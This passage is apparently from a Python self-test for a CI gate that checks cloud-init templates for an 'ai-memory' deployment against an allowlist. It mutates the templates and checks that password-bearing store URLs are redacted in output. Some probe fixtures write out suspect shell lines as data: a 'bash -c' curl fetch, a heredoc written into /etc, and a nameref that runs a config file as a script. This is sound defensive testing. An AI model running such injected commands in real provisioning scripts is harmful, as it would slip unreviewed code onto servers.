    red("C4 unlisted line in the embedded script", [ins(RELOAD, ["bash -c 'curl https://e'"], before=True)], autolist=False)
    red("C4 unlisted line in a heredoc body", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "curl https://e", "EOF"], before=True)],
        autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
    # ---- rules 1-4 and user-data
    red("R1 non-ASCII byte", [(RELOAD, "      systemctl daemon-reload —\n")], autolist=False)
    red("R2 no serve ExecStart", [(EXEC, "ExecStart=" + BIN + " mcp")])
    red("R4 missing --tls-key", [(" --tls-key /etc/ai-memory/tls/node.key", "")])
    red("U AWS main.tf without base64gzip (#4703)", [], maintf_sub=("user_data_base64 = base64gzip(templatefile(\"${path.module}/cloud-init-memory.yaml.tpl\"", "user_data = (templatefile(\"${path.module}/cloud-init-memory.yaml.tpl\""))
    red("U gzip over the limit (#4703)", [(RELOAD, RELOAD + "".join("      # %s\n" % hashlib.sha256(b"%d" % k).hexdigest() for k in range(400)))])
    P.append(("U do-hive over 64 KiB without gzip", "red", dict(do=[("runcmd:\n", "".join("# %s\n" % hashlib.sha512(b"%d" % k).hexdigest() for k in range(520)) + "runcmd:\n")], autolist=True, core=True)))
    P.append(("U template with no known limit", "fault", dict(add_template=("infra/other/cloud-init-memory.yaml.tpl", None))))
    # ---- condition 3: allowlist form
    P.append(("A malformed entry", "fault", dict(allow_add="both | only-two-fields")))
    P.append(("A unknown scope", "fault", dict(allow_add="gcp | top | runcmd:")))
    P.append(("A non-normalised entry", "fault", dict(allow_add="both | top | runcmd:  x")))
    P.append(("A duplicate entry", "red", dict(allow_dup=True)))
    P.append(("A entry in both allow and pending", "fault", dict(pend_dup=True)))
    P.append(("A malformed pending head", "fault", dict(pend_add="do-hive 4671 | top | x")))
    P.append(("A empty allowlist", "fault", dict(allow_text="# only a comment\n")))
    P.append(("A stale entry", "red", dict(allow_add="aws-gpu-burst | top | nothing-matches:", autolist=False)))
    P.append(("A stale both entry (one template only)", "red", dict(allow_add="both | " + PROV_PATH + " | echo only-in-aws > /x", aws=[ins(RELOAD, ["echo only-in-aws > /x"], before=True)], autolist=False)))
    P.append(("A stale pending entry", "red", dict(pend_sub=("do-hive #4671 | /etc/ai-memory/store-url | ", "do-hive #4671 | top | nothing-matches: "), autolist=False)))
    # an approved line moved to the pending list skips the validators: the tracker must be known and under its ceiling (#5098)
    P.append(("A approved line moved under a tracker over its ceiling (#5098)", "fault", dict(pend_move="#4671", autolist=False)))
    P.append(("A approved line moved under a placeholder tracker #0 (#5098)", "fault", dict(pend_move="#0", autolist=False)))
    P.append(("A approved line moved under a zero-led tracker #00 (#5098)", "fault", dict(pend_move="#00", autolist=False)))
    P.append(("A approved line moved under an unknown tracker (#5098)", "fault", dict(pend_move="#99999999", autolist=False)))
    P.append(("A fewer than two templates", "fault", dict(drop_do=True)))
    P.append(("A two templates in one directory", "fault", dict(add_template=("infra/aws-gpu-burst/cloud-init-memory-2.yaml.tpl", "aws"))))
    P.append(("A template with zero triggered lines", "fault", dict(do_text="")))
    P.append(("A real templates (green control)", "green", dict(autolist=False)))
    return P


def apply_muts(text: str, muts) -> str:
    for old, new in muts:
        if old not in text:
            raise RuntimeError("self-test fixture drift: %r not in the template" % old[:60])
        text = text.replace(old, new, 1)
    return text


def case_inputs(base: tuple, spec: dict):
    """Return run_scan arguments for one probe spec."""
    templates, maintfs, allow, pend = base
    t = dict(templates)
    t[AWS_TEMPLATE] = apply_muts(t[AWS_TEMPLATE], spec.get("aws", ()))
    t[DO_TEMPLATE] = apply_muts(t[DO_TEMPLATE], spec.get("do", ()))
    if "do_text" in spec:
        t[DO_TEMPLATE] = spec["do_text"]
    if spec.get("drop_do"):
        del t[DO_TEMPLATE]
    if "add_template" in spec:
        nm, src = spec["add_template"]
        t[nm] = templates[AWS_TEMPLATE] if src == "aws" else templates[AWS_TEMPLATE]
    mt = dict(maintfs)
    if "maintf_sub" in spec:
        old, new = spec["maintf_sub"]
        if old not in mt["aws-gpu-burst"]:
            raise RuntimeError("self-test fixture drift in aws main.tf")
        mt["aws-gpu-burst"] = mt["aws-gpu-burst"].replace(old, new, 1)
    a = spec.get("allow_text", allow)
    if "allow_add" in spec:
        a = a + spec["allow_add"] + "\n"
    first = next(x for x in allow.splitlines() if x and not x.startswith("#"))
    if spec.get("allow_dup"):
        a = a + first + "\n"
    p = pend
    if spec.get("pend_dup"):
        p = p + first.split(" | ", 1)[0] + " #4671 | " + first.split(" | ", 1)[1] + "\n"
    if "pend_add" in spec:
        p = p + spec["pend_add"] + "\n"
    if "pend_move" in spec:
        moved = next(x for x in a.splitlines() if x and not x.startswith("#") and not x.startswith("both | "))
        a = a.replace(moved + "\n", "", 1)
        sc, rest = moved.split(" | ", 1)
        p = p + sc + " " + spec["pend_move"] + " | " + rest + "\n"
    if "pend_sub" in spec:
        old, new = spec["pend_sub"]
        if old not in p:
            raise RuntimeError("self-test fixture drift in the pending list")
        p = p.replace(old, new, 1)
    return t, mt, a, p, spec.get("autolist", False), spec.get("extra", ())


def verdict(hits: list, faults: list, spec: dict) -> str:
    if faults:
        return "fault"
    core = [h for h in hits if "stale entry" not in h and "not in the allowlist" not in h] if spec.get("autolist") or spec.get("core") else hits
    return "red" if core else "green"


def entry_mutations(base: tuple, cache: dict) -> list:
    """Condition 4: for every allow entry, a template whose first matching line
    has ' #m' appended to its last physical line."""
    templates, _, allow, _ = base
    out = []
    by_scope = {scope_of(nm): nm for nm in templates}
    tf_seen = {}
    for raw in allow.splitlines():
        if not raw or raw.startswith("#"):
            continue
        sc, ctx, line = raw.split(" | ", 2)
        nm = by_scope["aws-gpu-burst" if sc == "both" else sc]
        if ctx == "tf-region":
            k = tf_seen.get(nm, 0)
            tf_seen[nm] = k + 1
            spans = tf_region_spans(templates[nm])
            if k >= len(spans) or tf_regions(templates[nm])[k] != line:
                raise RuntimeError("self-test: tf-region entry %d matches no region in order: %s" % (k + 1, scrub(raw)[:80]))
            phys = templates[nm].split("\n")
            a, b = spans[k]
            body = [x for x in range(a, b + 1) if DIRECTIVE_LINE_RE.match(phys[x]) is None]
            at = body[-1] if body else a
            phys[at] = phys[at] + " #m" if body else "%{ if true }"
            out.append((raw, nm, "\n".join(phys)))
            continue
        lines, _, _, trig, _ = analyse(nm, templates[nm], cache)
        ln = next((x for x in trig if x.ctx == ctx and x.text == line), None)
        if ln is None:
            raise RuntimeError("self-test: allow entry matches nothing: " + raw[:80])
        phys = templates[nm].split("\n")
        phys[ln.last - 1] = phys[ln.last - 1] + " #m"
        out.append((raw, nm, "\n".join(phys)))
    return out


def probe_failure(label: str, expect: str, got: str, found: list) -> str:
    """The self-test line for a probe with the wrong verdict: the hit count and up to 3
    hits whole, so the line names why the probe went red (#5385)."""
    shown = "".join("\n    " + scrub(h) for h in found[:3])
    more = "\n    ... %d more" % (len(found) - 3) if len(found) > 3 else ""
    return "%s: expected %s, got %s (%d hits)%s%s" % (label, expect, got, len(found), shown, more)


SCRUB_CASES = [
    ("postgres://u:pw@h/db", "postgres://<userinfo>@h/db"),
    ("postgres://u:p/w@h/db", "postgres://<userinfo>@h/db"),
    ("postgresql://u:p@w@h/db", "postgresql://<userinfo>@h/db"),
    ("POSTGRES://u:pw@h/db", "POSTGRES://<userinfo>@h/db"),
    ("'postgres://aimemory:Cut'", "'postgres://<userinfo>'"),
    ("postgres://localhost/db?sslmode=verify-full", "postgres://localhost/db?sslmode=verify-full"),
]


def secret_output_problems(base: tuple, known: set) -> list:
    """Failure output holds no password (#5438): a store-url password plus one nameref
    makes rule R5 read the store-url file as script, and the hits that quote its line or a
    word cut from it must print no password byte, in main() or in a self-test failure."""
    bad = []
    for raw, want in SCRUB_CASES:
        if scrub(raw) != want:
            bad.append("scrub(%r) gave %r, not %r" % (raw, scrub(raw), want))
    dec = "      systemctl daemon-reload\n"
    nameref = "      A=/etc/ai-memory/run.conf; declare -n R=A; bash \"$R\"\n"
    for pw in ("SecretMark9xyz", "Secret/Mark9/xyz/Secret/Mark9/xyz/Secret/Mark9/xyz", "Secret$Mark9$xyz$Secret$Mark9$xyz", "Secret/Mark9/" * 20):
        spec = {"aws": [("aimemory:CHANGEME@", "aimemory:%s@" % pw), (dec, nameref + dec)]}
        t, mt, a, p, auto, extra = case_inputs(base, spec)
        hits, faults, _ = run_scan(t, mt, a, p, known, cache={})
        out = printable(faults, "FAULT: ") + "\n" + printable(hits) + "\n" + probe_failure("p", "green", "red", faults + hits)
        if not hits:
            bad.append("a store-url password with a nameref was not refused (%r)" % pw[:12])
        if "Mark9" in out:
            bad.append("failure output carries a store-url password (%r)" % pw[:12])
    # the expansion hit cuts the command word at 40 bytes: scrub first, or the cut drops the @
    spec = {"aws": [(dec, "      postgres://aimemory:ExpMark9xyzExpMark9xyzExpMark9xyz@h/$X a\n" + dec)]}
    t, mt, a, p, auto, extra = case_inputs(base, spec)
    hits, faults, _ = run_scan(t, mt, a, p, known, cache={})
    if not any("expansion or command substitution" in h for h in hits):
        bad.append("an expanded command word that quotes a store url was not refused")
    if "ExpMark9" in "\n".join(faults + hits):
        bad.append("an expansion hit carries a store-url password")
    # main() itself prints through printable: stub the scan so that its hit and fault both
    # quote a password, and read what reaches stderr (a fault path and a hit path)
    scan_real, load_real = globals()["run_scan"], globals()["load_repo"]
    quoted = ["x: command word 'postgres://aimemory:MainMark9xyz@localhost' is a glob"]
    try:
        globals()["load_repo"] = lambda: ({}, {}, "", "")
        for faults_in in ([], ["FAULT quoted postgres://aimemory:MainMark9xyz@localhost"]):
            globals()["run_scan"] = lambda *a, _f=faults_in, **k: (quoted, _f, {})
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = main(["check"])
            if rc not in (1, 2) or "MainMark9" in err.getvalue() or "<userinfo>" not in err.getvalue():
                bad.append("main() printed a store-url password or no redaction (rc %r)" % rc)
        # the exception path of main() and probe_failure on a raw hit (#5438)
        def boom():
            raise RuntimeError("bad postgres://aimemory:ExcMark9xyz@localhost")
        globals()["load_repo"] = boom
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            rc = main(["check"])
        if rc != 2 or "ExcMark9" in err.getvalue() or "<userinfo>" not in err.getvalue():
            bad.append("main() exception path printed a store-url password (rc %r)" % rc)
    finally:
        globals()["run_scan"], globals()["load_repo"] = scan_real, load_real
    if "PfMark9" in probe_failure("p", "green", "red", ["x postgres://aimemory:PfMark9xyz@localhost"]):
        bad.append("probe_failure printed a store-url password")
    return bad


def r5_cache_problems(base: tuple, known: set) -> list:
    """A scan answered from the cache keeps the R5 reason (#5439)."""
    dec = "      systemctl daemon-reload\n"
    spec = {"aws": [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      foo /\n" + dec)], "autolist": True}
    t, mt, a, p, auto, extra = case_inputs(base, spec)
    cache, seen = {}, []
    for _ in range(2):
        R5_READ_AS_SCRIPT.clear()
        run_scan(t, mt, a, p, known, autolist=auto, extra=extra, cache=cache)
        seen.append(dict(R5_READ_AS_SCRIPT))
    if not seen[0].get("/etc/ai-memory/run.conf") or seen[0] != seen[1]:
        return ["the R5 reason is lost or differs when a scan is answered from the cache: %r then %r" % tuple(seen)]
    return []


def pin_problems() -> list:
    """Direct pins for checks a verdict-level probe cannot reach (#5324, #5100, #5329, #5446)."""
    bad = []
    # every name word of a declare -n is a nameref (#5324)
    if not {"A", "B", "X"} <= nameref_facts(["declare -n A=X B"])[0]:
        bad.append("nameref_facts did not record every name word of a declare -n")
    # -- ends the option words, and an expanded option word can be -n (#5323)
    if nameref_facts(["declare -- $X=1"]) != (set(), False):
        bad.append("nameref_facts did not stop at -- before a name word")
    if not nameref_facts(["declare -$X R=A"])[1]:
        bad.append("nameref_facts did not poison an expanded option word")
    # the fields of a split name are in its value set (IFS cut, #5100)
    if not {"x", "/var/r"} <= var_values([("w", "IFS=:; G=x:/var/r; cp $G /usr/local/bin/", {})]).get("G", set()):
        bad.append("var_values did not cut a split name on IFS")
    # an IFS the gate cannot read leaves a split name standing for any text (#5100)
    if var_values([("w", "IFS=$X; G=a:b; cp $G /x", {})]).get("G") != {VALUES_PAST_CAP}:
        bad.append("var_values did not collapse a split name under an IFS it cannot read")
    # no value set is kept past EXPAND_CAP: the cap, not only that one exists (#5329)
    for n in range(1, EXPAND_CAP.bit_length() + 3):
        vals = var_values([("w", "F+=a", {})] * n).get("F", set())
        if vals != {VALUES_PAST_CAP} and len(vals) > EXPAND_CAP:
            bad.append("an append chain of %d kept %d values, past EXPAND_CAP" % (n, len(vals)))
    return bad


def self_test(known: set) -> int:
    base = load_repo()
    cache = {}
    bad, counts = [], {"red": 0, "green": 0, "fault": 0}
    for label, expect, spec in build_probes():
        t, mt, a, p, auto, extra = case_inputs(base, spec)
        R5_READ_AS_SCRIPT.clear()
        hits, faults, _ = run_scan(t, mt, a, p, known, autolist=auto, extra=extra, cache=cache)
        got = verdict(hits, faults, spec)
        counts[expect] += 1
        if got != expect:
            why = ["R5: %s is read as script: the use %r names it" % kv for kv in sorted(R5_READ_AS_SCRIPT.items())]
            bad.append(probe_failure(label, expect, got, why + list(faults or hits)))
        elif spec.get("present") and not any(spec["present"] in h for h in hits):
            bad.append("%s: expected a hit naming %r, got none" % (label, spec["present"]))
    muts = entry_mutations(base, cache)
    for raw, nm, text in muts:
        t = dict(base[0])
        t[nm] = text
        hits, faults, _ = run_scan(t, base[1], base[2], base[3], known, cache=cache)
        want = "| tf-region: " if " | tf-region | " in raw else "not in the allowlist"
        if faults or not any(want in h for h in hits):
            bad.append("entry mutation stayed green: " + raw[:100])
    # each append at least doubles the value set: past EXPAND_CAP it collapses, so a chain
    # stays linear (#5329); a chain this short passes the cap and keeps a mutant fast
    chain = [(0, "F+=a%d" % i, 0) for i in range(EXPAND_CAP.bit_length())]
    if var_values(chain).get("F") != {VALUES_PAST_CAP}:
        bad.append("an append chain past EXPAND_CAP did not collapse its value set")
    # a failure line keeps each hit whole (#5385)
    long_hit = "x" * 150 + " the reason"
    if long_hit not in probe_failure("p", "green", "red", ["a", long_hit, "b", "c"]):
        bad.append("a probe failure line cut a hit")
    bad.extend(r5_cache_problems(base, known))
    bad.extend(pin_problems())
    bad.extend(secret_output_problems(base, known))
    with contextlib.redirect_stderr(io.StringIO()):
        try:
            build_parser().parse_args(["--bogus"])
            bad.append("a mistyped argument was accepted")
        except SystemExit as exc:
            if exc.code != 2:
                bad.append("a mistyped argument exited %r, not 2" % exc.code)
    if bad:
        print(printable(bad, "SELF-TEST FAIL: "), file=sys.stderr)
        return 1
    print("SELF-TEST PASS: %d red probes flagged, %d green probes clean, %d form faults raised, %d/%d allow-entry mutations red, append chain past the cap collapses, mistyped argument exits 2"
          % (counts["red"], counts["green"], counts["fault"], len(muts), len(muts)))
    return 0


def main(argv: list) -> int:
    args = build_parser().parse_args(argv[1:])
    try:
        known = serve_flags(SERVE_SRC.read_text(encoding="utf-8"))
        if args.self_test:
            return self_test(known)
        templates, maintfs, allow, pend = load_repo()
        if args.list_triggers:
            print("\n".join(list_triggers(templates, {})))
            return 0
        hits, faults, stats = run_scan(templates, maintfs, allow, pend, known)
    except (OSError, RuntimeError, UnicodeDecodeError) as exc:
        print("FAULT: %s" % scrub(str(exc)), file=sys.stderr)
        return 2
    if faults:
        print(printable(faults, "FAULT: "), file=sys.stderr)
        if hits:
            print(printable(hits), file=sys.stderr)
        return 2
    if hits:
        print(printable(hits), file=sys.stderr)
        print("FAIL: %d cloud-init template defect(s)" % len(hits), file=sys.stderr)
        print("  list the changed approved lines: scripts/regen-cloud-init-token-allow.py <repo-root>; after review, rerun it with --accept-new and review its diff", file=sys.stderr)
        return 1
    print("PASS: %d templates, %d allow entries, %d pending entries, %d triggered lines, %d serve flags known"
          % (stats["templates"], stats["allow"], stats["pending"], stats["triggered"], len(known)))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
